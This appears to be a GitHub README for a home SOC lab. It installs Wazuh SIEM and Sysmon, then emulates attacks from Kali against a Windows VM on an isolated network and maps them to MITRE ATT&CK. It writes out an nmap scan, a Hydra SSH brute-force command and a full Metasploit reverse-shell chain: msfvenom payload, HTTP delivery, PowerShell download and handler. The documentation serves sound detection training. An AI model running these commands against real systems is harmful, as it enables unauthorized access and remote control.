# wazuh-soc-lab
Wazuh-based SOC lab for attack emulation, Sysmon log analysis, custom detection rules, and MITRE ATT&CK–aligned threat detection.
# Wazuh SOC Home Lab

A hands-on 3-VM Security Operations Center (SOC) home lab where I simulated
real-world cyberattacks from Kali Linux and detected them using Wazuh SIEM
on Ubuntu — all mapped to the MITRE ATT&CK framework.

---

## Lab Architecture

![Lab Architecture](screenshots/lab-architecture.png)

| VM | Role | OS |
|----|------|----|
| Ubuntu 22.04 | Wazuh SIEM Server | Linux |
| Windows 10 | Target + Wazuh Agent | Windows |
| Kali Linux | Attacker Machine | Linux |

**Workstation:** VMware  
**Network:** Isolated NAT Network (no external traffic)

---

## Tools & Technologies

| Tool | Purpose |
|------|---------|
| Wazuh | SIEM — log collection, analysis, alert generation |
| Sysmon | Deep Windows process/network/file event monitoring |
| Wazuh Agent | Ships Windows logs to Wazuh server |
| Nmap | Network reconnaissance simulation |
| Hydra | SSH brute force attack simulation |
| Metasploit | Reverse shell payload generation & exploitation |
| SwiftOnSecurity Config | Community Sysmon ruleset for better detection |

---

## Setup & Configuration

### Step 1 — Ubuntu System Update
Updated Ubuntu before Wazuh installation to ensure clean environment.
![Ubuntu Update](screenshots/ubuntu-update.png)

### Step 2 — Wazuh Installation on Ubuntu
Installed Wazuh all-in-one (Manager + Indexer + Dashboard) using the
official installation script.

![Wazuh Installation](screenshots/wazuh-installation.png)
![Wazuh Installation Complete](screenshots/wazuh-installation-complete.png)

### Step 3 — Wazuh Dashboard Access
Accessed Wazuh web dashboard after successful installation.

![Wazuh Login](screenshots/wazuh-login-page.png)
![Wazuh Dashboard](screenshots/wazuh-dashboard.png)

### Step 4 — Sysmon Installation on Windows
Installed Sysmon with SwiftOnSecurity config for deep Windows event
monitoring before deploying Wazuh Agent.

![Sysmon Installation](screenshots/sysmon-installation-in-windows.png)

### Step 5 — Deploying Wazuh Agent from Server
Generated agent deployment commands from Wazuh server dashboard.

![Deploying Agent](screenshots/deploying-agent-01.png)
![Agent Commands](screenshots/deploying-agent-02.png)

### Step 6 — Installing Agent on Windows
Ran the agent installation commands in Windows PowerShell.

![Installing Agent on Windows](screenshots/installing-agent-on-windows.png)

### Step 7 — Agent Active Verification
Verified Windows agent is connected and active in Wazuh dashboard.

![Agent Active](screenshots/verifying-agent-01.png)

### Step 8 — Adding Sysmon to ossec.conf
Configured Wazuh agent to collect Sysmon logs by adding localfile block
in ossec.conf — this enables Sysmon alerts to flow to Wazuh server.

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

![ossec.conf Configuration](screenshots/adding-sysmon-to-ossec.conf.png)

### Step 9 — Restarting Wazuh Service on Windows
Restarted WazuhSvc after ossec.conf changes to apply configuration.

![Restarting Service](screenshots/restarting-wazuh-service-in-windows.png)

---

## Attack Scenarios

### Network Connectivity Verification
Verified Kali can reach Windows target before launching attacks.

![Kali to Windows Ping](screenshots/kali-to-windows-ping.png)

---

### Attack 1 — Nmap Port Scan

| Field | Detail |
|-------|--------|
| Tool | Nmap |
| Target | Windows 10 (192.168.23.129) |
| Command | `nmap -A -T4 192.168.23.129` |
| MITRE Technique | T1046 — Network Service Discovery |
| Tactic | Discovery |
| Severity | Medium |

**Attack Execution — Kali:**

![Nmap Scan](screenshots/nmap-scan.png)

**Alert Detected — Wazuh:**

![Nmap Alert](screenshots/nmap-scan-alert.png)

---

### Attack 2 — SSH Brute Force (Hydra)

| Field | Detail |
|-------|--------|
| Tool | Hydra |
| Target | Windows 10 SSH (Port 22) |
| Command | `hydra -l administrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.23.129 -t 4 -V` |
| Wordlist | rockyou.txt (14 million passwords) |
| MITRE Technique | T1110.001 — Brute Force: Password Guessing |
| Tactic | Credential Access |
| Severity | High |

**Attack Execution — Kali:**

![Hydra Attack](screenshots/hydra-brute-force.png)

**Alert Detected — Wazuh:**

![Hydra Alert](screenshots/hydra-brute-force-alert.png)

> Wazuh generated 15 authentication_failed alerts within 60 seconds
> of Hydra attack — real-time detection confirmed.

---

### Attack 3 — Metasploit Reverse Shell

| Field | Detail |
|-------|--------|
| Tool | Metasploit (msfvenom + msfconsole) |
| Payload | windows/x64/meterpreter/reverse_tcp |
| MITRE Technique | T1059.001 — Command & Scripting Interpreter |
| Tactic | Execution + Command & Control |
| Severity | Critical |

**Phase 1 — Payload Generation on Kali:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.128 LPORT=4444 -f exe > shell.exe
```
![Payload Generation](screenshots/metasploit-reverse-shell-01.png)

**Phase 2 — HTTP Server to Deliver Payload:**
```bash
python3 -m http.server 8080
```
![HTTP Server](screenshots/metasploit-reverse-shell-01.png)

**Phase 3 — Payload Download on Windows:**
```powershell
Invoke-WebRequest -Uri "http://192.168.23.128:8080/shell.exe" -OutFile "C:\shell.exe"
```
![Windows Download](screenshots/metasploit-reverse-shell-02.png)

**Phase 4 — Listener Setup on Kali (msfconsole):**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.23.128
set LPORT 4444
run
```
![Listener](screenshots/metasploit-reverse-shell-03.png)

**Phase 5 — Payload Executed on Windows + Meterpreter Session:**

![Payload Executed on Windows](screenshots/metasploit-reverse-shell-04.png)
![Meterpreter Session](screenshots/metasploit-reverse-shell-05.png)

**Alert Detected — Wazuh:**

![Metasploit Alert](screenshots/metasploit-reverse-shell-alert.png)

---

## Attack Summary

| # | Attack | Tool | MITRE | Tactic | Severity | Detected |
|---|--------|------|-------|--------|----------|---------|
| 1 | Port Scan | Nmap | T1046 | Discovery | Medium | ✅ Yes |
| 2 | SSH Brute Force | Hydra | T1110.001 | Credential Access | High | ✅ Yes |
| 3 | Reverse Shell | Metasploit | T1059.001 | Execution | Critical | ✅ Yes |

---

## Key Learnings

- Deployed and configured a full Wazuh SIEM stack from scratch
- Understood how Sysmon captures deep Windows telemetry at process,
  network, and file level
- Configured Wazuh Agent to collect Sysmon logs via ossec.conf
- Executed 3 real attack scenarios and observed detection in real-time
- Correlated alerts with MITRE ATT&CK framework techniques
- Understood the full attack lifecycle: reconnaissance → exploitation
  → post-exploitation → detection

---

## Project Structure
wazuh-soc-lab/
├── README.md
├── LICENSE
└── screenshots/
    ├── lab-architecture.png
    ...
---
*Built by Mukul Kumar — SOC Analyst skill development and portfolio demonstration.*
